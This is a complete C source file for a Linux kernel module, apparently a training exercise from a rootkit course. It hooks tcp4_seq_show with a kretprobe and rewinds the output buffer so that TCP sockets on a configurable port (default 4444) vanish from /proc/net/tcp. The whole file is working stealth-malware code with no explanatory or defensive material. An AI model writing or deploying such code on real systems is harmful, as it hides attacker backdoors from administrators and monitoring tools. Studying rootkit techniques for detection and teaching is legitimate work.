// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/inet.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <net/sock.h>

static unsigned short hidden_port = 4444;
module_param(hidden_port, ushort, 0400);

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

static int rk_tcp_show_entry(struct kretprobe_instance *inst,
			     struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;
	struct seq_file *seq = (struct seq_file *)regs->di;
	void *v = (void *)regs->si;
	struct sock *sk;
	struct inet_sock *inet;

	data->seq = NULL;
	if (v == SEQ_START_TOKEN)
		return 0;
	sk = (struct sock *)v;
	inet = inet_sk(sk);
	if (ntohs(inet->inet_sport) == hidden_port) {
		data->seq = seq;
		data->prev_count = seq->count;
	}
	return 0;
}

static int rk_tcp_show_return(struct kretprobe_instance *inst,
			      struct pt_regs *regs)
{
	struct rk_tcp_data *data = (void *)inst->data;

	if (data->seq)
		data->seq->count = data->prev_count;
	return 0;
}

static struct kretprobe tcp_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	.entry_handler = rk_tcp_show_entry,
	.handler = rk_tcp_show_return,
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

static int __init rk_init(void)
{
	if (!hidden_port)
		return -EINVAL;
	return register_kretprobe(&tcp_probe);
}

static void __exit rk_exit(void)
{
	unregister_kretprobe(&tcp_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
